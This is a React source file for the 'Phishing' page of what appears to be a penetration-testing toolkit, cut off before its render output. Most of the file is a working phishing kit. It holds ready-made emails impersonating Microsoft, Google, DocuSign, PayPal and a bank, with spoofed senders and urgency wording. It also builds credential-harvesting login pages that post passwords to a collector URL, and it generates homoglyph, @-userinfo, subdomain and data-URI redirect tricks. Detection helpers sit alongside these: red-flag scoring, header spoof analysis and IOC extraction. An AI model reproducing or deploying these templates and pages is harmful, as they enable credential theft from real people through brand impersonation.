import { useCallback, useMemo, useState } from "react";
import {
  Mail,
  Link2,
  ShieldAlert,
  FileText,
  AlertTriangle,
  Download,
  Info,
} from "lucide-react";
import { Card } from "../components/ui/Card.jsx";
import { Input } from "../components/ui/Input.jsx";
import { CopyButton } from "../components/ui/CopyButton.jsx";

const mono = "JetBrains Mono, monospace";
const heading = "Space Grotesk, sans-serif";
const ACCENT = "#FB7185";
const BG = "#0B0E14";
const PANEL = "#12161F";
const BORDER = "rgba(255,255,255,0.08)";
const TEXT = "#E2E8F0";
const DIM = "rgba(226,232,240,0.55)";

const EMAIL_TEMPLATES = [
  {
    id: "m365",
    label: "Microsoft 365 — password reset",
    subject: "Action required: Reset your Microsoft 365 password",
    fromName: "Microsoft Account Team",
    fromEmail: "no-reply@accountprotection.microsoft.com",
    html: `<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="font-family:Segoe UI,Arial,sans-serif;background:#f3f2f1;padding:24px;">
<tr><td align="center"><table width="600" style="background:#fff;border-radius:4px;padding:32px;">
<tr><td><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="108" alt="" style="margin-bottom:24px;"/></td></tr>
<tr><td style="font-size:20px;font-weight:600;color:#323130;">Hi {{TARGET_NAME}},</td></tr>
<tr><td style="padding-top:16px;font-size:15px;color:#323130;line-height:1.5;">We detected unusual sign-in activity for your work account. For your security, you must verify your identity and update your password within 24 hours.</td></tr>
<tr><td style="padding-top:28px;"><a href="{{CUSTOM_LINK}}" style="background:#0078d4;color:#fff;text-decoration:none;padding:12px 24px;border-radius:2px;font-weight:600;display:inline-block;">Verify account</a></td></tr>
<tr><td style="padding-top:24px;font-size:12px;color:#605e5c;">If you did not request this, you can ignore this message. Reference: MS-SEC-{{URGENCY_REF}}</td></tr>
</table></td></tr></table>`,
  },
  {
    id: "google",
    label: "Google — security alert",
    subject: "Security alert: New sign-in to your Google Account",
    fromName: "Google",
    fromEmail: "no-reply@accounts.google.com",
    html: `<div style="font-family:Roboto,Arial,sans-serif;max-width:560px;margin:0 auto;background:#fff;padding:40px 24px;border:1px solid #dadce0;border-radius:8px;">
<div style="text-align:center;margin-bottom:24px;"><span style="font-size:22px;font-weight:500;color:#3c4043;">G</span><span style="color:#ea4335;font-size:22px;font-weight:500;">o</span><span style="color:#fbbc04;font-size:22px;font-weight:500;">o</span><span style="color:#4285f4;font-size:22px;font-weight:500;">g</span><span style="color:#34a853;font-size:22px;font-weight:500;">l</span><span style="color:#ea4335;font-size:22px;font-weight:500;">e</span></div>
<p style="color:#3c4043;font-size:14px;line-height:1.6;">Hello {{TARGET_NAME}},</p>
<p style="color:#3c4043;font-size:14px;line-height:1.6;">A new sign-in to your account was detected from an unrecognized device. If this was you, no action is needed. Otherwise, secure your account immediately.</p>
<p style="margin-top:28px;"><a href="{{CUSTOM_LINK}}" style="background:#1a73e8;color:#fff;padding:10px 24px;border-radius:4px;text-decoration:none;font-size:14px;font-weight:500;">Review activity</a></p>
<p style="color:#5f6368;font-size:12px;margin-top:32px;">You received this email to {{TARGET_EMAIL}}</p>
</div>`,
  },
  {
    id: "docusign",
    label: "DocuSign — document to sign",
    subject: "Please sign: Employment Agreement — Action Required",
    fromName: "DocuSign via HR Portal",
    fromEmail: "dse@docusign.net",
    html: `<div style="font-family:Helvetica,Arial,sans-serif;background:#f7f7f7;padding:32px;">
<table width="100%" style="max-width:520px;margin:0 auto;background:#fff;border-radius:2px;box-shadow:0 1px 4px rgba(0,0,0,0.08);">
<tr><td style="padding:28px 32px;border-bottom:1px solid #e9e9e9;"><span style="font-size:20px;font-weight:700;color:#4c00ff;">DocuSign</span></td></tr>
<tr><td style="padding:28px 32px;">
<p style="margin:0 0 12px;color:#333;font-size:15px;">Hi {{TARGET_NAME}},</p>
<p style="color:#666;font-size:14px;line-height:1.5;">You have a document ready to review and sign. This envelope expires soon — please complete it at your earliest convenience.</p>
<p style="margin-top:24px;"><a href="{{CUSTOM_LINK}}" style="background:#4c00ff;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;font-weight:600;font-size:14px;">Review document</a></p>
</td></tr>
<tr><td style="padding:16px 32px;background:#fafafa;font-size:11px;color:#999;">Do not share this link. Powered by DocuSign®</td></tr>
</table></div>`,
  },
  {
    id: "linkedin",
    label: "LinkedIn — invitation",
    subject: "You have an invitation from a colleague",
    fromName: "LinkedIn",
    fromEmail: "invitations@linkedin.com",
    html: `<div style="font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f3f2ef;padding:24px;">
<table style="max-width:512px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;">
<tr><td style="padding:24px 28px;"><div style="color:#0a66c2;font-weight:700;font-size:18px;">Linked<span style="color:#000;">in</span></div></td></tr>
<tr><td style="padding:0 28px 28px;">
<p style="color:#000;font-size:16px;margin:0 0 8px;">Hi {{TARGET_NAME}},</p>
<p style="color:rgba(0,0,0,0.6);font-size:14px;line-height:1.5;">Someone in your network would like to connect. Accept the invitation to grow your professional network.</p>
<a href="{{CUSTOM_LINK}}" style="display:inline-block;margin-top:20px;background:#0a66c2;color:#fff;text-decoration:none;padding:10px 20px;border-radius:24px;font-weight:600;font-size:14px;">Accept invitation</a>
</td></tr></table></div>`,
  },
  {
    id: "it",
    label: "IT — password expiry",
    subject: "[IT] Your network password expires in 48 hours",
    fromName: "IT Helpdesk",
    fromEmail: "helpdesk@company.internal",
    html: `<div style="font-family:Calibri,Arial,sans-serif;border-left:4px solid #c00;padding:20px 24px;background:#fff;max-width:560px;">
<p style="margin:0 0 8px;font-size:16px;font-weight:bold;color:#333;">Corporate IT Notification</p>
<p style="color:#333;font-size:14px;">Dear {{TARGET_NAME}},</p>
<p style="color:#333;font-size:14px;line-height:1.5;">Your domain password will expire in <strong>48 hours</strong>. Failure to update will result in <strong>account lockout</strong> and loss of VPN/email access.</p>
<p style="margin-top:20px;"><a href="{{CUSTOM_LINK}}" style="color:#fff;background:#c00;padding:10px 18px;text-decoration:none;font-weight:bold;">Update password now</a></p>
<p style="color:#666;font-size:12px;margin-top:24px;">IT Support • Do not reply to this mailbox</p>
</div>`,
  },
  {
    id: "bank",
    label: "Bank — transaction alert",
    subject: "Unusual transaction detected on your account",
    fromName: "Fraud Prevention",
    fromEmail: "alerts@secure-banking-notify.com",
    html: `<div style="font-family:Georgia,serif;background:#eef2f6;padding:28px;">
<table style="max-width:480px;margin:0 auto;background:#fff;border:1px solid #ccd;">
<tr><td style="background:#003366;color:#fff;padding:16px 20px;font-size:18px;">Secure Banking Alert</td></tr>
<tr><td style="padding:24px 20px;">
<p style="margin:0 0 12px;color:#222;">Valued customer {{TARGET_NAME}},</p>
<p style="color:#444;font-size:14px;line-height:1.5;">We flagged a transaction that doesn't match your usual pattern. Confirm whether you authorized this activity to avoid a temporary hold on your card.</p>
<p style="margin-top:22px;text-align:center;"><a href="{{CUSTOM_LINK}}" style="background:#003366;color:#fff;padding:12px 32px;text-decoration:none;">Confirm transaction</a></p>
<p style="color:#888;font-size:11px;margin-top:28px;">This message was sent to {{TARGET_EMAIL}}</p>
</td></tr></table></div>`,
  },
  {
    id: "amazon",
    label: "Amazon — order confirmation",
    subject: "Your Amazon.com order of \"Wireless Earbuds\"",
    fromName: "Amazon.com",
    fromEmail: "auto-confirm@amazon.com",
    html: `<div style="font-family:Arial,sans-serif;background:#f0f2f2;padding:20px;">
<table style="max-width:600px;margin:0 auto;background:#fff;">
<tr><td style="padding:18px 24px;border-bottom:1px solid #ddd;"><span style="font-size:22px;"><span style="color:#232f3e;">amazon</span><span style="color:#ff9900;">.com</span></span></td></tr>
<tr><td style="padding:24px;">
<p style="font-size:14px;color:#111;">Hello {{TARGET_NAME}},</p>
<p style="font-size:14px;color:#111;">Thank you for your order. Track your shipment or update delivery preferences using the link below.</p>
<p style="margin-top:18px;"><a href="{{CUSTOM_LINK}}" style="color:#007185;">View order details</a></p>
<p style="font-size:12px;color:#555;margin-top:24px;">Order placed to {{TARGET_EMAIL}}</p>
</td></tr></table></div>`,
  },
  {
    id: "zoom",
    label: "Zoom — meeting invite",
    subject: "Zoom meeting invitation — Q4 Planning (starts in 15 min)",
    fromName: "Zoom",
    fromEmail: "no-reply@zoom.us",
    html: `<div style="font-family:Helvetica,Arial,sans-serif;max-width:520px;margin:0 auto;border:1px solid #e0e0e0;border-radius:6px;padding:28px;">
<div style="color:#2D8CFF;font-size:22px;font-weight:700;margin-bottom:16px;">zoom</div>
<p style="color:#232333;font-size:15px;margin:0 0 8px;">Hi {{TARGET_NAME}},</p>
<p style="color:#666;font-size:14px;line-height:1.5;">You are invited to a scheduled Zoom meeting. The host is waiting — please join as soon as possible.</p>
<p style="margin-top:24px;"><a href="{{CUSTOM_LINK}}" style="background:#2D8CFF;color:#fff;padding:12px 28px;text-decoration:none;border-radius:8px;font-weight:600;">Join meeting</a></p>
<p style="color:#999;font-size:12px;margin-top:28px;">Meeting invite sent to {{TARGET_EMAIL}}</p>
</div>`,
  },
  {
    id: "paypal",
    label: "PayPal — account limitation (bonus)",
    subject: "We've limited your account — action needed",
    fromName: "PayPal Service",
    fromEmail: "service@paypal.com",
    html: `<div style="font-family:PayPal Sans,Arial,sans-serif;background:#f5f7fa;padding:32px;">
<table style="max-width:500px;margin:0 auto;background:#fff;border-radius:4px;padding:32px;">
<tr><td><div style="color:#003087;font-weight:bold;font-size:20px;margin-bottom:20px;">PayPal</div></td></tr>
<tr><td style="color:#2c2e2f;font-size:14px;line-height:1.5;">
<p>Hello {{TARGET_NAME}},</p>
<p>We've temporarily limited what you can do with your account until we verify a few details. Log in to resolve this quickly.</p>
<p style="margin-top:24px;"><a href="{{CUSTOM_LINK}}" style="background:#0070ba;color:#fff;padding:12px 24px;text-decoration:none;border-radius:24px;font-weight:bold;">Log in to PayPal</a></p>
</td></tr></table></div>`,
  },
];

const LANDING_TEMPLATES = {
  microsoft: { title: "Sign in to Microsoft", subtitle: "Use your work or school account", userLabel: "Email, phone, or Skype", passLabel: "Password", brandColor: "#0078d4" },
  google: { title: "Sign in", subtitle: "with your Google Account", userLabel: "Email or phone", passLabel: "Enter your password", brandColor: "#1a73e8" },
  o365: { title: "Sign in", subtitle: "Office 365 • Your organization", userLabel: "Email address", passLabel: "Password", brandColor: "#0078d4" },
  vpn: { title: "Corporate VPN", subtitle: "Secure remote access portal", userLabel: "Username", passLabel: "PIN / Password", brandColor: "#6366f1" },
  wifi: { title: "Guest Wi‑Fi Portal", subtitle: "Accept terms to connect", userLabel: "Employee ID or email", passLabel: "Verification code", brandColor: "#10b981" },
  custom: { title: "Secure login", subtitle: "Enter your credentials", userLabel: "Username", passLabel: "Password", brandColor: "#FB7185" },
};

const HOMOGLYPHS = {
  a: "\u0430",
  A: "\u0410",
  e: "\u0435",
  E: "\u0415",
  o: "\u043E",
  O: "\u041E",
  p: "\u0440",
  P: "\u0420",
  c: "\u0441",
  C: "\u0421",
  x: "\u0445",
  X: "\u0425",
  y: "\u0443",
  Y: "\u0423",
  i: "\u0456",
  I: "\u0406",
  j: "\u0458",
  J: "\u0408",
};

const SUSPICIOUS_TLDS = new Set([
  "tk", "ml", "ga", "cf", "gq", "xyz", "top", "work", "click", "link", "buzz", "icu", "cyou", "zip", "mov",
]);

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function htmlToPlainText(html) {
  return String(html)
    .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "")
    .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "")
    .replace(/<br\s*\/?>/gi, "\n")
    .replace(/<\/(p|div|tr|h[1-6])>/gi, "\n")
    .replace(/<[^>]+>/g, "")
    .replace(/\n{3,}/g, "\n\n")
    .trim();
}

function applyEmailVars(html, vars) {
  return html
    .replace(/\{\{TARGET_NAME\}\}/g, escapeHtml(vars.targetName))
    .replace(/\{\{TARGET_EMAIL\}\}/g, escapeHtml(vars.targetEmail))
    .replace(/\{\{CUSTOM_LINK\}\}/g, vars.customLink)
    .replace(/\{\{URGENCY_REF\}\}/g, vars.urgencyRef);
}

function buildUrgencyRef(level) {
  if (level === "High") return "URG-H";
  if (level === "Medium") return "STD-M";
  return "LOW";
}

function computeRedFlags({ subject, fromEmail, fromName, html, customLink, urgency }) {
  const flags = [];
  const lowerSub = subject.toLowerCase();
  if (/\b(urgent|immediately|within \d+|expire|suspend|verify now|action required)\b/i.test(subject)) {
    flags.push({
      severity: "high",
      title: "Subject line urgency",
      detail: "Pressure language in the subject is a common phishing tactic.",
    });
  }
  if (urgency === "High") {
    flags.push({
      severity: "high",
      title: "High urgency level",
      detail: "Aggressive deadlines reduce critical thinking — classic social engineering.",
    });
  }
  const fe = fromEmail.toLowerCase();
  if (/secure-banking-notify|@.*-.*\.(com|net)/i.test(fe) || (/notify|secure-|verify-/i.test(fe) && !fe.endsWith(".microsoft.com") && !fe.endsWith(".google.com"))) {
    flags.push({
      severity: "medium",
      title: "Suspicious sender domain",
      detail: "Legitimate brands rarely use hyphen-heavy or generic “notify” domains — compare with known-good addresses.",
    });
  }
  if (fromName.toLowerCase().includes("it ") && !fe.endsWith(".internal") && fe.includes("helpdesk")) {
    flags.push({
      severity: "low",
      title: "IT branding vs domain",
      detail: "Internal IT often uses consistent corporate domains — compare with your org’s real addresses.",
    });
  }
  const hrefMatch = html.match(/href="([^"]+)"/i);
  const firstHref = hrefMatch ? hrefMatch[1] : "";
  if (customLink && firstHref && firstHref !== customLink && !firstHref.includes("{{")) {
    flags.push({
      severity: "high",
      title: "Link href mismatch",
      detail: "The visible button may not match the actual destination URL.",
    });
  }
  if (/http:\/\//i.test(customLink) && !/^http:\/\/localhost/i.test(customLink)) {
    flags.push({
      severity: "medium",
      title: "Plain HTTP link",
      detail: "Credential pages over HTTP are suspicious; legitimate services prefer HTTPS.",
    });
  }
  if (lowerSub.includes("password") && lowerSub.includes("reset")) {
    flags.push({
      severity: "low",
      title: "Password reset theme",
      detail: "Always verify via official app or typed URL — never from email alone.",
    });
  }
  if (html.includes('display:inline-block') && html.split("<a ").length > 2) {
    flags.push({
      severity: "low",
      title: "Multiple call-to-action links",
      detail: "Some campaigns add redundant links to improve click-through.",
    });
  }
  return flags;
}

function homoglyphDomain(hostname) {
  let out = "";
  for (const ch of hostname) {
    out += HOMOGLYPHS[ch] ?? ch;
  }
  return out;
}

function ipv4ToNumber(parts) {
  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
}

function parseIpv4(str) {
  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(str.trim());
  if (!m) return null;
  const p = [1, 2, 3, 4].map((i) => parseInt(m[i], 10));
  if (p.some((n) => n > 255)) return null;
  return p;
}

function ipObfuscations(ipStr) {
  const p = parseIpv4(ipStr);
  if (!p) return null;
  const n = ipv4ToNumber(p);
  const hex = "0x" + n.toString(16);
  const octal =
    "0" +
    p
      .map((x) => x.toString(8))
      .join(".")
      .replace(/^0/, "");
  return { decimal: String(n), hex, octalDotted: octal };
}

function generateLandingHtml(opts) {
  const t = LANDING_TEMPLATES[opts.templateKey] || LANDING_TEMPLATES.custom;
  const company = escapeHtml(opts.companyName || "Your Organization");
  const bg = opts.bgColor || "#0f172a";
  const btn = escapeHtml(opts.buttonText || "Sign in");
  const action = escapeHtml(opts.postEndpoint || "https://example.com/collect");
  const redirect = escapeHtml(opts.redirectUrl || "https://www.microsoft.com");
  const logo = opts.logoUrl ? `<img src="${escapeHtml(opts.logoUrl)}" alt="" style="max-height:48px;margin-bottom:16px;"/>` : "";

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>${t.title}</title>
<style>
body{margin:0;font-family:Segoe UI,system-ui,sans-serif;background:${bg};min-height:100vh;display:flex;align-items:center;justify-content:center;}
.banner{position:fixed;top:0;left:0;right:0;background:#b45309;color:#fff;text-align:center;padding:8px 12px;font-size:12px;font-weight:600;z-index:9999;}
.card{background:#fff;border-radius:8px;padding:36px 40px;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.2);}
h1{margin:0 0 8px;font-size:22px;color:#1e293b;}
p.sub{margin:0 0 24px;color:#64748b;font-size:14px;}
label{display:block;font-size:12px;color:#64748b;margin-bottom:6px;}
input{width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #cbd5e1;border-radius:4px;margin-bottom:16px;font-size:14px;}
button{width:100%;padding:12px;background:${t.brandColor};color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;}
footer{margin-top:20px;font-size:11px;color:#94a3b8;text-align:center;}
</style>
</head>
<body>
<div class="banner">For authorized penetration testing only — credentials are simulated / collected per engagement rules.</div>
<div style="margin-top:48px;width:100%;display:flex;justify-content:center;padding:16px;">
  <div class="card">
    ${logo}
    <h1 style="color:${t.brandColor};">${escapeHtml(t.title)}</h1>
    <p class="sub">${company} — ${escapeHtml(t.subtitle)}</p>
    <form method="post" action="${action}">
      <label>${escapeHtml(t.userLabel)}</label>
      <input type="text" name="username" autocomplete="username" required placeholder="name@company.com"/>
      <label>${escapeHtml(t.passLabel)}</label>
      <input type="password" name="password" autocomplete="current-password" required placeholder="••••••••"/>
      <input type="hidden" name="redirect" value="${redirect}"/>
      <button type="submit">${btn}</button>
    </form>
    <footer>© simulation — security assessment use only</footer>
  </div>
</div>
</body>
</html>`;
}

function parseEmailHeaders(raw) {
  const lines = String(raw).split(/\r?\n/);
  const headers = {};
  let cur = null;
  for (const line of lines) {
    if (/^\s/.test(line) && cur) {
      headers[cur] += " " + line.trim();
    } else {
      const idx = line.indexOf(":");
      if (idx > 0) {
        cur = line.slice(0, idx).trim().toLowerCase();
        headers[cur] = line.slice(idx + 1).trim();
      }
    }
  }
  return headers;
}

function extractReceivedIps(raw) {
  const ips = new Set();
  const re = /\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g;
  for (const line of String(raw).split(/\n/)) {
    if (/^(received|x-originating-ip|x-sender-ip):/i.test(line)) {
      let m;
      const s = line;
      re.lastIndex = 0;
      while ((m = re.exec(s)) !== null) ips.add(m[0]);
    }
  }
  const xo = String(raw).match(/x-originating-ip:\s*([^\s]+)/i);
  if (xo) ips.add(xo[1].replace(/[\[\]]/g, ""));
  return [...ips];
}

function extractAuthResults(raw) {
  const block = String(raw).match(/authentication-results:[^\n]+/gi) || [];
  const out = { spf: null, dkim: null, dmarc: null };
  const text = block.join(" ").toLowerCase();
  const pick = (name) => {
    const m = new RegExp(`${name}=([a-z]+)`, "i").exec(text);
    return m ? m[1] : null;
  };
  out.spf = pick("spf");
  out.dkim = pick("dkim");
  out.dmarc = pick("dmarc");
  return out;
}

function analyzeFromSpoof(headers) {
  const from = headers.from || "";
  const returnPath = headers["return-path"] || "";
  const replyTo = headers["reply-to"] || "";
  const fromMatch = from.match(/<([^>]+)>/);
  const fromAddr = fromMatch ? fromMatch[1] : from.replace(/.*</, "").replace(/>.*$/, "").trim();
  const rpMatch = returnPath.match(/<([^>]+)>/) || [null, returnPath.replace(/[<>]/g, "")];
  const rpAddr = (rpMatch[1] || "").trim();
  let spoofRisk = "low";
  let note = "Compare From with Return-Path and DKIM alignment in full headers.";
  if (fromAddr && rpAddr && !fromAddr.toLowerCase().includes(rpAddr.split("@")[1] || "@")) {
    const fd = fromAddr.split("@")[1] || "";
    const rd = rpAddr.split("@")[1] || "";
    if (fd && rd && fd !== rd) {
      spoofRisk = "high";
      note = "From domain differs from Return-Path domain — possible display-name or domain spoofing.";
    }
  }
  if (replyTo && fromAddr && !replyTo.toLowerCase().includes(fromAddr.split("@")[0].toLowerCase())) {
    spoofRisk = spoofRisk === "high" ? "high" : "medium";
    note += " Reply-To does not align with From.";
  }
  return { fromAddr, returnPath: rpAddr, replyTo, spoofRisk, note };
}

function analyzeUrl(urlStr) {
  let u;
  try {
    u = new URL(urlStr.trim());
  } catch {
    return { error: "Invalid URL", score: 0, parts: {}, indicators: [] };
  }
  const indicators = [];
  let score = 0;
  const host = u.hostname;
  const parts = {
    protocol: u.protocol,
    hostname: host,
    port: u.port || "(default)",
    pathname: u.pathname,
    search: u.search,
    hash: u.hash,
    username: u.username || "(none)",
    password: u.password ? "(present)" : "(none)",
  };

  if (u.protocol === "data:") {
    indicators.push({ sev: "critical", text: "data: URI — can hide malicious payloads" });
    score += 35;
  }

  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host) || host.startsWith("0x")) {
    indicators.push({ sev: "high", text: "Host is an IP address — rare for legitimate login pages" });
    score += 25;
  }

  const tld = host.split(".").pop() || "";
  if (SUSPICIOUS_TLDS.has(tld.toLowerCase())) {
    indicators.push({ sev: "high", text: `TLD “.${tld}” is commonly abused` });
    score += 18;
  }

  const subCount = host.split(".").length - 2;
  if (subCount > 3) {
    indicators.push({ sev: "medium", text: "Many subdomains — possible deceptive structure" });
    score += 12;
  }

  if (u.username && host) {
    indicators.push({ sev: "high", text: "Userinfo in URL (@ trick) — may hide real host" });
    score += 28;
  }

  if (/%25[0-9a-f]{2}/i.test(u.href) || (/%[0-9a-f]{2}/gi.test(u.href) && u.href.length > 120)) {
    indicators.push({ sev: "medium", text: "Heavy or double URL-encoding" });
    score += 10;
  }

  if (/xn--/.test(host)) {
    indicators.push({ sev: "medium", text: "Punycode (xn--) domain — verify visually" });
    score += 8;
  }

  if (/[\u0400-\u04FF\u0500-\u052F]/.test(host)) {
    indicators.push({ sev: "critical", text: "Possible homoglyph / confusable characters in host (Cyrillic range detected)" });
    score += 30;
  }

  if (host.includes("login.") && host.split(".").length > 3) {
    indicators.push({ sev: "low", text: "Contains “login.” with extra domain segments — review right-most registrable domain" });
    score += 6;
  }

  score = Math.min(100, score);
  return { error: null, score, parts, indicators, href: u.href };
}

function extractIOCs(text) {
  const s = String(text);
  const ips = [...new Set(s.match(/\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g) || [])];
  const emails = [...new Set(s.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
  const urls = [...new Set(s.match(/https?:\/\/[^\s"'<>[\]]+/gi) || [])];
  const domains = [...new Set(s.match(/\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b/g) || [])].filter(
    (d) => !ips.includes(d) && d.includes(".")
  );
  const hashes = {
    md5: [...new Set(s.match(/\b[a-fA-F0-9]{32}\b/g) || [])],
    sha1: [...new Set(s.match(/\b[a-fA-F0-9]{40}\b/g) || [])],
    sha256: [...new Set(s.match(/\b[a-fA-F0-9]{64}\b/g) || [])],
  };
  return { ips, emails, urls, domains, hashes };
}

function sevColor(sev) {
  if (sev === "critical" || sev === "high") return "#FB7185";
  if (sev === "medium") return "#FBBF24";
  return "#94a3b8";
}

export default function Phishing() {
  const [tab, setTab] = useState(0);

  const [templateId, setTemplateId] = useState(EMAIL_TEMPLATES[0].id);
  const [subject, setSubject] = useState(EMAIL_TEMPLATES[0].subject);
  const [fromName, setFromName] = useState(EMAIL_TEMPLATES[0].fromName);
  const [fromEmail, setFromEmail] = useState(EMAIL_TEMPLATES[0].fromEmail);
  const [targetName, setTargetName] = useState("Alex Rivera");
  const [targetEmail, setTargetEmail] = useState("alex.rivera@company.com");
  const [customLink, setCustomLink] = useState("https://login.example-engagement.test/verify");
  const [urgency, setUrgency] = useState("Medium");

  const selectedTemplate = useMemo(
    () => EMAIL_TEMPLATES.find((t) => t.id === templateId) || EMAIL_TEMPLATES[0],
    [templateId]
  );

  const onPickTemplate = useCallback((id) => {
    setTemplateId(id);
    const t = EMAIL_TEMPLATES.find((x) => x.id === id);
    if (t) {
      setSubject(t.subject);
      setFromName(t.fromName);
      setFromEmail(t.fromEmail);
    }
  }, []);

  const builtHtml = useMemo(() => {
    const vars = {
      targetName,
      targetEmail,
      customLink,
      urgencyRef: buildUrgencyRef(urgency),
    };
    const body = applyEmailVars(selectedTemplate.html, vars);
    return body;
  }, [selectedTemplate, targetName, targetEmail, customLink, urgency]);

  const plainText = useMemo(() => htmlToPlainText(builtHtml), [builtHtml]);

  const redFlags = useMemo(
    () =>
      computeRedFlags({
        subject,
        fromEmail,
        fromName,
        html: builtHtml,
        customLink,
        urgency,
      }),
    [subject, fromEmail, fromName, builtHtml, customLink, urgency]
  );

  const [landTemplate, setLandTemplate] = useState("microsoft");
  const [companyName, setCompanyName] = useState("Contoso Ltd");
  const [logoUrl, setLogoUrl] = useState("");
  const [bgColor, setBgColor] = useState("#0f172a");
  const [buttonText, setButtonText] = useState("Sign in");
  const [postEndpoint, setPostEndpoint] = useState("https://collector.pentest.local/submit");
  const [redirectUrl, setRedirectUrl] = useState("https://login.microsoftonline.com");

  const landingHtml = useMemo(
    () =>
      generateLandingHtml({
        templateKey: landTemplate,
        companyName,
        logoUrl,
        bgColor,
        buttonText,
        postEndpoint,
        redirectUrl,
      }),
    [landTemplate, companyName, logoUrl, bgColor, buttonText, postEndpoint, redirectUrl]
  );

  const downloadLanding = () => {
    const blob = new Blob([landingHtml], { type: "text/html" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "landing-simulation.html";
    a.click();
    URL.revokeObjectURL(a.href);
  };

  const [obfUrl, setObfUrl] = useState("https://login.microsoftonline.com/secure");

  const obfuscationBlocks = useMemo(() => {
    let parsed;
    try {
      parsed = new URL(obfUrl.trim());
    } catch {
      return { error: "Enter a valid URL", blocks: [] };
    }
    const host = parsed.hostname;
    const pathQuery = parsed.pathname + parsed.search + parsed.hash;
    const evilHost = "evil.example.com";
    const shortSlug = "a1b2c3d";
    const blocks = [];

    blocks.push({
      title: "URL shortener format (examples only)",
      content: `bit.ly/${shortSlug}\ntinyurl.com/${shortSlug}\nshort.link/${shortSlug}\n\nOriginal (hidden behind redirect):\n${parsed.href}`,
    });

    const hg = homoglyphDomain(host);
    if (hg !== host) {
      blocks.push({
        title: "Homoglyph domain example",
        content: `${parsed.protocol}//${hg}${pathQuery}\n\n(Cyrillic lookalikes: a→а, o→о, e→е — verify in browser address bar)`,
      });
    }

    blocks.push({
      title: "Subdomain trick",
      content: `${parsed.protocol}//login.${host}.${evilHost}${pathQuery}\n\nVictims may only notice “login.${host}” at the start.`,
    });

    blocks.push({
      title: "@ symbol / userinfo trick",
      content: `${parsed.protocol}//${host}@${evilHost}${pathQuery}\n\nBrowser resolves host as ${evilHost}; text before @ is userinfo.`,
    });

    const ipParsed = parseIpv4(host);
    if (ipParsed) {
      const o = ipObfuscations(host);
      blocks.push({
        title: "IP literal alternate forms",
        content: `Dotted decimal: ${host}\nDecimal (32-bit): ${parsed.protocol}//${o.decimal}${pathQuery}\nHex: ${parsed.protocol}//${o.hex}${pathQuery}\nOctal dotted: ${parsed.protocol}//${o.octalDotted}${pathQuery}\n\nNote: client support varies; for awareness only.`,
      });
    }

    const minimalRedirect = `<html><head><meta http-equiv="refresh" content="0;url=${escapeHtml(parsed.href)}"/></head><body><script>location.replace("${parsed.href.replace(/"/g, '\\"')}");<\/script></body></html>`;
    const b64 = typeof btoa !== "undefined" ? btoa(unescape(encodeURIComponent(minimalRedirect))) : "";
    blocks.push({
      title: "Data URI (embedded HTML redirect)",
      content: `data:text/html;base64,${b64}\n\n(Decodes to meta refresh + JS redirect — educational demo)`,
    });

    blocks.push({
      title: "HTML redirect page (save as .html)",
      content: minimalRedirect,
    });

    blocks.push({
      title: "URL encoding tricks",
      content: `Single-encoded (example):\n${encodeURI(parsed.href)}\n\nDouble-encoded (example):\n${encodeURIComponent(parsed.href)}\n\nMixed-case percent bytes (example):\n${parsed.href.replace(/%([0-9a-f]{2})/gi, (_, h) => "%" + (h[0] === h[0].toLowerCase() ? h.toUpperCase() : h.toLowerCase()))}`,
    });

    return { error: null, blocks };
  }, [obfUrl]);

  const [analysisInput, setAnalysisInput] = useState("");

  const headerAnalysis = useMemo(() => {
    const raw = analysisInput.trim();
    if (!raw.includes(":") || !/^[\w-]+:/m.test(raw)) return null;
    const headers = parseEmailHeaders(raw);
    const auth = extractAuthResults(raw);
    const ips = extractReceivedIps(raw);
    const spoof = analyzeFromSpoof(headers);
    const receivedChain = raw
      .split(/\n/)
      .filter((l) => /^received:/i.test(l))
      .slice(0, 12);
    return { headers, auth, ips, spoof, receivedChain };
  }, [analysisInput]);

  const urlAnalysis = useMemo(() => {
    const raw = analysisInput.trim();
    const urlMatch = raw.match(/https?:\/\/[^\s]+/i);
    const single = urlMatch ? urlMatch[0] : raw;
    if (!/^https?:\/\//i.test(single)) return null;
    return analyzeUrl(single);
  }, [analysisInput]);

  const iocs = useMemo(() => extractIOCs(analysisInput), [analysisInput]);

  const tabBtn = (i, label, Icon) => (
    <button
      type="button"
      key={label}
      onClick={() => setTab(i)}
      style={{
        fontFamily: mono,
        fontSize: 11,
        fontWeight: 600,
        padding: "10px 16px",
        borderRadius: 8,
        border: tab === i ? `1px solid ${ACCENT}` : `1px solid ${BORDER}`,
        background: tab === i ? "rgba(251,113,133,0.12)" : PANEL,
        color: tab === i ? ACCENT : DIM,
        cursor: "pointer",
        display: "inline-flex",
        alignItems: "center",
        gap: 8,
      }}
    >
      <Icon size={14} style={{ opacity: 0.9 }} />
      {label}
    </button>
  );

  const labelStyle = { fontFamily: mono, fontSize: 10, fontWeight: 600, color: DIM, textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 6 };

  return (
